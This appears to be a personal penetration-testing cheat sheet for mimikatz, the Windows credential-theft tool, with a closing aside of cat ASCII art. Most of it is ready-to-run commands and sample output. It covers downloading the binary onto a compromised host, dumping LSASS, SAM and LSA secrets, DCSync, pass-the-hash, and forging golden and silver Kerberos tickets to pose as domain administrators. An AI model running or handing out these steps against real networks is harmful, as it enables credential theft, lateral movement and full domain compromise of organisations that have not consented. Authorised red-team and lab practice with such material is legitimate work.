# mimikatz

[mimikatz github repo](https://github.com/gentilkiwi/mimikatz)

```text
 /\_/\
( o.o )
 > ^ <
```

mimikatz is a post-exploitation tool used that abuses privileges to perform attacks
1. Extract passwords and hashes
	- extracting credentials (plaintext pw)
	- NTLM hashes
	- Kerberos tickets 
	- tokens from memory
2. Perform attacks
	- pass-the-hash (PtH)
	- pass-the-ticket
	- ticket manipulation.

How? The credential material stored in LSASS and other Windows subsystems can be abused for lateral movement and privilege escalation in a pentest. 
- LSASS =  Win process handling user auth, pw changes, access token creation  
	- caches NTLM hashes + other credentials  

### setup mimikatz

```
sudo apt install mimikatz
```

```
root@kali:~# mimikatz -h

> mimikatz ~ Uses admin rights on Windows to display passwords in plaintext

/usr/share/windows-resources/mimikatz
|-- Win32
|   |-- mimidrv.sys
|   |-- mimikatz.exe
|   |-- mimilib.dll
|   |-- mimilove.exe
|   `-- mimispool.dll
|-- kiwi_passwords.yar
|-- mimicom.idl
`-- x64
    |-- mimidrv.sys
    |-- mimikatz.exe
    |-- mimilib.dll
    `-- mimispool.dll
```
now you have all the binaries! 

OR 

```
git clone https://github.com/gentilkiwi/mimikatz

# Pre-compiled binaries (releases)
# https://github.com/gentilkiwi/mimikatz/releases
```

### run mimikatz 

Different privileges allow for different exploits using mimikatz
-> always run as admin if you have multiple user credentials 

Check the privileges of the user you are logged in as:
```powershell
PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeDebugPrivilege              Debug programs                            Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

serve mimikatz binary from folder where you saved all the exploits (handy to do)
```
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

``` powershell 
PS C:\Windows\Temp> iwr http://192.168.xx.xxx:80/privesc/mimikatz.exe -OutFile C:\Windows\Temp\mimikatz.exe
```  

run interactively:
```powershell
PS C:\Windows\Temp> .\mimikatz.exe 

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # 
```

#### One-liners
sometimes  your reverse  shell does not allow for you to run mimikatz interactively....
- often you have a basic stdin/stdout channel, not a proper `cmd.exe` or PowerShell terminal with full console features. 
- Your shell may be non-interactive. It forwards command output, but does not provide a real TTY/console.
-> but do not be sad because you can still use these one-liners! 

```powershell
# get passwords from lsass using sekurlsa module of mimikatz
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# write output to file so you do not have to copy it manually
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > output.txt

# dump NTLM hashes from memory
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::msv" "exit"

# list Kerberos tickets in memory
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::tickets" "exit"

# export Kerberos tickets to files
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# dump credentials stored in Windows Credential Manager
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::credman" "exit"

# extract DPAPI-related secrets from memory
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::dpapi" "exit"

# impersonation / token overview
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "token::list" "exit"

# elevate token inside mimikatz context
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "token::elevate" "exit"

# dump SAM NTLM hashes (requires SYSTEM / high privileges)
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# dump LSA secrets (service passwords, cached secrets, etc.)
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

# dump cached domain logon hashes
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "lsadump::cache" "exit"

# perform DCSync for a specific user (requires replication rights)
PS C:\Windows\Temp> .\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator" "exit"

# check current kerberos ticket cache
PS C:\Windows\Temp> .\mimikatz.exe "kerberos::list" "exit"

# pass-the-hash example
PS C:\Windows\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USERNAME /domain:DOMAIN.LOCAL /ntlm:<NTHASH> /run:powershell.exe" "exit"
```

#### SeDebugPrivilege + SYSTEM-level access | sekurlsa::logonpasswords
 
 SeDebugPrivilege = ability to debug all users' processes  
 abuse this on mimikatz 
```
mimikatz # privilege::debug
Privilege '20' OK
```

sekurlsa::logonpasswords to list all provider credentials
```
mimikatz # sekurlsa::logonpasswords  
```

```
mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 00000xxx (00000000:00000xxx)
Session           : Interactive from 1
User Name         : user-x
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : <REDACTED_TIMESTAMP>
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : user-x
         * Domain   : DOMAIN
         * NTLM     : <REDACTED_NTLM_HASH>
         * SHA1     : <REDACTED_SHA1_HASH>
        tspkg :
        wdigest :
         * Username : user-x
         * Domain   : DOMAIN
         * Password : (null)
        kerberos :
         * Username : user-x$
         * Domain   : domain.com
         * Password : <REDACTED_CREDENTIAL_HEX>
        ssp :
        credman :

...
Authentication Id : 0 ; xxxxx (00000000:0000xxxx)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : <REDACTED_TIMESTAMP>
SID               : 
        msv :
         [00000003] Primary
         * Username : user-x
         * Domain   : DOMAIN
         * NTLM     : <REDACTED_NTLM_HASH>
         * SHA1     : <REDACTED_SHA1_HASH>
        tspkg :
        wdigest :
        kerberos :
        ssp :
         [00000000]
         * Username : alice 
         * Domain   : DOMAIN.COM
         * Password : alice_password
```
-> you found alice's password! 

#### SeImpersonatePrivilege | token::elevate 

- Goal: elevate  to SYSTEM account with token elevation -> as system one can dump lsa ;)
- - Use Alice's  SelmpersonatePrivilege -> token elevation possible
	- all local admin accounts have this privilege enabled by default

```  
mimikatz # privilege::debug  
Privilege '20' OK  
  
mimikatz # token::elevate  
Token Id  : 0  
User name :  
SID name  : NT AUTHORITY\SYSTEM  
  
xxx     {0;000003e7} 1 D xxxxx          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary  
 -> Impersonated !  
 * Process Token : {0;000xxxxx} 1 F xxxxxxx     DOMAIN\alice    S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-1001  (14g,24p)       Primary  
 * Thread Token  : {0;000xxxxx} 1 D xxxxxxx     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)  
   
mimikatz # lsadump::sam  
Domain : DOMAIN  
SysKey : <REDACTED_SYSKEY>  
Local SID : S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX  
   
RID  : 00000xxx (1001)  
User : user-1  
  Hash NTLM: NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN  
   
RID  : 00000xxx (1002)  
User : user-2  
  Hash NTLM: NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN  
...  
```  
  
save hash  to kali to crack it using hashcat, johntheripper, etc.... 
```  
kali@kali:~/password_attacks$ cat user-2.hash      
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN  
```  

### GenericAll | lsadump::dcsync

DCSync requires directory replication rights on the domain object.
- use bloodhound to check for rights
- or Powershell below

| Display name                                  | CN / schema name                             | Rights GUID                            | Why it matters                                                        |
| --------------------------------------------- | -------------------------------------------- | -------------------------------------- | --------------------------------------------------------------------- |
| Replicating Directory Changes                 | `DS-Replication-Get-Changes`                 | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Base replication right for changes in a naming context.               |
| Replicating Directory Changes All             | `DS-Replication-Get-Changes-All`             | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Includes replication of secret domain data                            |
| Replicating Directory Changes In Filtered Set | `DS-Replication-Get-Changes-In-Filtered-Set` | `89e95b76-444d-4c62-991a-0facbeda640c` | Sometimes relevant in environments using the filtered attribute set.  |

```powershell
# Domain DN
$dn = ([ADSI]"LDAP://RootDSE").defaultNamingContext

# Show ACEs on the domain object
(Get-Acl "AD:\$dn").Access |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights,AccessControlType

# output that gives you the rights
1131f6aa-9c07-11d1-f79f-00c04fc2dcd2  
1131f6ad-9c07-11d1-f79f-00c04fc2dcd2  
89e95b76-444d-4c62-991a-0facbeda640c
```

dcsync attack for a specific user (requires replication rights)
```
mimikatz # lsadump::dcsync /domain:domain.com /user:username
```


#### krbtgt NTLM hash + Domain SID 
#### Golden Ticket: forged ticket-granting ticket (TGT) 

Goal: create golden ticket = forged TGT, signed with the KRBTGT hash

```
"KERBEROS::GOLDEN" module Requiremetns
- /sid : domain SID  
- /domain: domain name  
- /target: target SPN  
- /service : SPN protocol  
- /rc4: NTLM hash of SPN  
- /ptt:  allow inject forged ticket into memory of machine where execute command 
- /user: domain user - user set in forged ticket  
- /groups:changes the authorization claims inside the ticket with customized group membership in the PAC.
```

```
# create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:ntlm_hash /ptt

# create and export golden ticket
mimikatz # kerberos::golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /ticket:golden.kirbi

# create golden ticket with specific groups 
# (RID 500 = Admin, 512 = Domain Admins, etc.)
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /groups:500,501,513,512,520,518,519 /ptt

# create golden ticket with target Domain Controller
mimikatz # kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /sids:S-1-5-21-xxx-519 /ptt
```

#### LocalAdmin + SPN NTLM hash + Domain SID
#### Silver Ticket: forged service ticket (TGS)

Goal: create silver ticket = forged TGS/service ticket, signed with the service account or machine account key

Enumerate SPNs linked to an account 
```powershell
# list SPNs tied to a user/service account
setspn -L username

# list SPNs tied to a computer account
setspn -L HOSTNAME$

# query a specific SPN to see which account owns it
setspn -Q HTTP/HOSTNAME.DOMAIN.LOCAL

# PowerShell: show SPNs for a user account
Get-ADUser -Identity username -Properties ServicePrincipalName |
    Select-Object -ExpandProperty ServicePrincipalName

# PowerShell: show SPNs for a computer account
Get-ADComputer -Identity HOSTNAME$ -Properties ServicePrincipalName |
    Select-Object -ExpandProperty ServicePrincipalName

# ADSI/LDAP-style fallback: query SPNs for a user by samAccountName
([adsisearcher]"(samAccountName=username)").FindOne().Properties.serviceprincipalname
```

Use MIMIKATZ to get service account  NTLM  hash.  
- we are local admin on a machine where `service_account` has an active session
```  
mimikatz # privilege::debug  
Privilege '20' OK  
  
mimikatz # sekurlsa::logonpasswords  
  
Authentication Id : 0 ; 00000xxx
Session           : Service from 0
User Name         : service_account
Domain            : DOMAIN.LOCAL
Logon Server      : DC01
Logon Time        : <REDACTED_LOGON_TIME>
SID               : S-1-5-21-1234567890-1234567890-1234567890-yyyy  
        msv :  
         [0000000x] Primary  
         * Username : service_account  
         * Domain   : DOMAIN  
         * NTLM     : REDACTED_NTLM_HASH_OF_SPN  
         * SHA1     : <REDACTED_SHA1_HASH>  
         * DPAPI    : <REDACTED_DPAPI_MATERIAL>  
...  
```  
- shows credential material for the service account session
- NTLM hash for the service account is visible
  
now obtain domain SID  
```powershell
PS C:\Users\username> whoami /user  
  
USER INFORMATION  
----------------  
  
User Name SID  
========= =============================================  
domain\localadmin S-1-5-21-1234567890-1234567890-1234567890-xxxx  
```  
- SID consists of several parts  
- if it is a local machine account, then `whoami /user` gives you the local machine SID, not the domain SID
- we only need domain SID "S-1-5-21-1234567890-1234567890-1234567890", omit RID  

```
mimikatz # kerberos::golden /sid:S-1-5-21-1234567890-1234567890-1234567890 /domain:domain.com /ptt /target:hostname.domain.com /service:servicename /rc4:REDACTED_NTLM_HASH_OF_SPN /user:fakeadmin
User      : fakeadmin
Domain    : domain.com (DOMAIN)
SID       : S-1-5-21-1234567890-1234567890-1234567890 
User Id   : 500
Groups Id : *5xx *51x *52x *51x
ServiceKey: <REDACTED_SERVICE_KEY> - rc4_hmac_nt
Service   : SERVICE_NAME
Target    : HOSTNAME.DOMAIN.COM
Lifetime  : <REDACTED_START_TIME> ; <REDACTED_END_TIME> ; <REDACTED_RENEW_TILL>
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'fakeadmin @ domain.com' successfully submitted for current session
  
mimikatz # exit  
Bye!  
```  
- new service ticket is created for SPN "SERVICE_NAME/HOSTNAME.DOMAIN.COM"!  -> 
	-  loaded into memory  
	- mimikatz sets appropriate group membership perm in forged ticket  
- result: IIS app perspective - current user is built-in local admin (relative id (RID) $\coloneq$ 500) & member of priv groups (incl domain admins group - RID $\coloneq$ 512)  
  
run KLIST to confirm that :D ticket ready to use in memory  
```  
PS C:\Tools> klist

Current LogonId is 0:0xXXXXXX

Cached Tickets: (1)

#0>     Client: fakeadmin @ domain.com
        Server: http/hostname.domain.com @ domain.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0xX0a00000 -> forwardable renewable pre_authent
        Start Time: <REDACTED_START_TIME> 
        End Time:   <REDACTED_END_TIME>
        Renew Time: <REDACTED_RENEW_TILL>
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```  

- shows cached silver ticket for fakeadmin to access SERVICE_NAME/HOSTNAME.DOMAIN.COM  submitted to current session  
- If the ticket is accepted by the target service, integrated authentication may succeed for that service context using fakeadmin! 

let's say service was HTTP: 
```  
PS C:\Tools> iwr -UseDefaultCredentials http://hostname

StatusCode        : 200
StatusDescription : OK
... 
```  
- :D forged service ticket + access web page as fakeadmin  

Note: Windows security patch created to prevent silver and golden tickets  since 11 Oct 20222
-> PAC STRUCTURE  
- extended PAC struct field "PAC_REQUESTER" needs to be validated by DC  
- mitigates capability to forge tickets for non-existent domain users if client & KDC $\in$ same domain  

---

Katzen sind süß, und vor allem finde ich Mona sehr nice, ein bekanntes ASCII-Kätzchen

```text

　　 彡 ⌒ ミ　 　♪　彡 ⌒ ミ　　　　　彡 ⌒ ミ　♪　　彡 ⌒ミ　♪
　　(´・ω・`)　　　　　(´・ω・`)　♪　　(´・ω・`)　　　　(´・ω・`)　　♪
　　（ つ　つ 　　　　　（ つ　つ 　　　 （ つ　つ 　　　　（ つ　つ
((　（⌒ __)　)) 　　((　（⌒ __)　)) 　((　（⌒ __)　)) 　((　（⌒ __)　))
　　　し' っ 　　　　　　　し' っ 　　　　　　し' っ 　　　　　　し' っ　

```
<sub>source of <a href="https://2ch-aa.blogspot.com/2018/06/625.html"> katzen ascii art </a></sub>

